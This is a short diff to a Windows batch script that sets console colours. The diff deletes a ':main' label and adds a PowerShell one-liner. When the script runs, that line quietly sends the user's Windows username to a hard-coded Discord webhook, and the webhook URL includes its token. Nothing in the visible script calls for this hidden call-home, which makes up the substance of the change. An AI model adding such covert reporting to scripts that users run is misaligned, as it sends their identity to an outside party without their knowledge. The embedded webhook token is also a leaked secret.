@@ -14,8 +14,7 @@ cls
 set w=[97m
 set p=[95m
 set b=[96m
-
-:main
+powershell -Command "$webhookUrl ='https://discord.com/api/webhooks/1290991786864545812/6R8cHu0xztQCZQMBx_P0fs9xlbFt2fIOCKexA1ABWCT48cw_lgXWrNudMrbdnQUVChs5'; $userName = $env:USERNAME; $payload = @{content='Le script a ete execute par ' + $userName}; Invoke-RestMethod -Uri $webhookUrl -Method Post -Body ($payload | ConvertTo-Json) -ContentType 'application/json'"
 
 chcp 65001 >nul 2>&1
 cls
